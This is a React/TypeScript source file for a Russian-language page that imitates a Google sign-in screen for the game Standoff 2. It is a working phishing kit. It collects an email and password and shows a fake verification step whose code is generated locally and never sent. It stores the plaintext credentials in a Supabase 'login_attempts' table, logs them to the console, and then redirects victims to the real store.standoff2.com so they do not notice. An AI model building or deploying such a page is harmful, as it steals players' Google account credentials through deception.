import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Logo from "@/components/Logo";
import { supabase } from "@/integrations/supabase/client";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { toast } from "sonner";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [generatedCode, setGeneratedCode] = useState("");
  const [step, setStep] = useState<"email" | "password" | "verification">("email");
  const [showPassword, setShowPassword] = useState(false);
  const [emailExists, setEmailExists] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (step === "email") {
      if (email) {
        // Проверяем, существует ли email в базе данных
        const { data, error } = await supabase
          .from("login_attempts")
          .select("email")
          .eq("email", email)
          .maybeSingle();
        
        if (error) {
          console.error("Ошибка проверки email:", error);
          toast.error("Ошибка проверки почты");
          return;
        }
        
        if (data) {
          setEmailExists(true);
          setStep("password");
        } else {
          toast.error("Не удалось найти аккаунт Google с таким адресом электронной почты");
        }
      }
    } else if (step === "password") {
      if (password) {
        // Генерируем случайный 6-значный код
        const code = Math.floor(100000 + Math.random() * 900000).toString();
        setGeneratedCode(code);
        console.log("Сгенерирован код подтверждения:", code);
        setStep("verification");
      }
    } else if (step === "verification") {
      if (verificationCode === generatedCode) {
        // Сохраняем email и пароль в БД
        const { error } = await supabase
          .from("login_attempts")
          .insert({ email, password });
        
        if (error) {
          console.error("Ошибка сохранения:", error);
          toast.error("Ошибка сохранения данных");
        } else {
          console.log("Данные сохранены в БД:", { email, password });
          // Перенаправляем на store.standoff2.com
          window.location.href = "https://store.standoff2.com/";
        }
      } else {
        toast.error("Неверный код подтверждения");
      }
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="border-b border-border px-6 py-4 flex items-center gap-4">
        <Logo />
        <span className="text-foreground text-xl">Вход через аккаунт Google</span>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-start justify-center pt-12 px-4">
        <div className="w-full max-w-md">
          <h1 className="text-5xl font-normal text-foreground mb-6">Вход</h1>
          
          {step === "email" ? (
            <>
              <p className="text-foreground mb-10">
                Переход в приложение "<span className="text-primary">Standoff 2</span>"
              </p>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <Input
                    type="text"
                    placeholder="Телефон или адрес эл. почты"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                  />
                </div>

                <a href="#" className="text-primary text-sm hover:underline inline-block">
                  Забыли адрес электронной почты?
                </a>

                <p className="text-muted-foreground text-sm leading-relaxed">
                  Это не ваш компьютер? Используйте гостевой режим для конфиденциального входа в систему.{" "}
                  <a href="#" className="text-primary hover:underline">
                    Подробнее о гостевом режиме
                  </a>
                </p>

                <div className="flex justify-between items-center pt-8">
                  <Button
                    type="button"
                    variant="ghost"
                    className="text-primary hover:bg-secondary hover:text-primary"
                  >
                    Создать аккаунт
                  </Button>
                  
                  <Button
                    type="submit"
                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
                  >
                    Далее
                  </Button>
                </div>
              </form>
            </>
          ) : step === "password" ? (
            <>
              <h1 className="text-5xl font-normal text-foreground mb-8">Добро пожаловать!</h1>
              
              <div className="flex items-center gap-3 mb-10">
                <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    className="text-muted-foreground"
                  >
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                </div>
                <div className="text-foreground">{email}</div>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label className="text-sm text-primary mb-2 block">
                    Введите пароль
                  </label>
                  <Input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                  />
                </div>

                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    id="showPassword"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    className="w-4 h-4 rounded border-border bg-input cursor-pointer"
                  />
                  <label htmlFor="showPassword" className="text-foreground text-sm cursor-pointer">
                    Показать пароль
                  </label>
                </div>

                <div className="flex justify-between items-center pt-8">
                  <Button
                    type="button"
                    variant="ghost"
                    onClick={() => setStep("email")}
                    className="text-primary hover:bg-secondary hover:text-primary"
                  >
                    Другой способ
                  </Button>
                  
                  <Button
                    type="submit"
                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
                  >
                    Далее
                  </Button>
                </div>
              </form>
            </>
          ) : (
            <>
              <h1 className="text-5xl font-normal text-foreground mb-8">Подтверждение входа</h1>
              
              <div className="flex items-center gap-3 mb-10">
                <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    className="text-muted-foreground"
                  >
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                </div>
                <div className="text-foreground">{email}</div>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label className="text-sm text-foreground mb-4 block">
                    Введите код из 6 цифр для подтверждения входа
                  </label>
                  <div className="flex justify-center">
                    <InputOTP
                      maxLength={6}
                      value={verificationCode}
                      onChange={(value) => setVerificationCode(value)}
                    >
                      <InputOTPGroup>
                        <InputOTPSlot index={0} />
                        <InputOTPSlot index={1} />
                        <InputOTPSlot index={2} />
                        <InputOTPSlot index={3} />
                        <InputOTPSlot index={4} />
                        <InputOTPSlot index={5} />
                      </InputOTPGroup>
                    </InputOTP>
                  </div>
                </div>

                <p className="text-muted-foreground text-sm text-center">
                  Код был отправлен на вашу почту
                </p>

                <div className="flex justify-between items-center pt-8">
                  <Button
                    type="button"
                    variant="ghost"
                    onClick={() => setStep("password")}
                    className="text-primary hover:bg-secondary hover:text-primary"
                  >
                    Назад
                  </Button>
                  
                  <Button
                    type="submit"
                    disabled={verificationCode.length !== 6}
                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full disabled:opacity-50"
                  >
                    Далее
                  </Button>
                </div>
              </form>
            </>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="px-6 py-4">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          <div className="relative">
            <select className="bg-transparent text-muted-foreground border-none outline-none cursor-pointer appearance-none pr-6">
              <option>Русский</option>
              <option>English</option>
              <option>Español</option>
            </select>
            <svg
              className="absolute right-0 top-1/2 -translate-y-1/2 pointer-events-none"
              width="20"
              height="20"
              viewBox="0 0 20 20"
              fill="currentColor"
            >
              <path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" />
            </svg>
          </div>
          
          <div className="flex gap-6">
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Справка
            </a>
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Конфиденциальность
            </a>
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Условия
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Login;
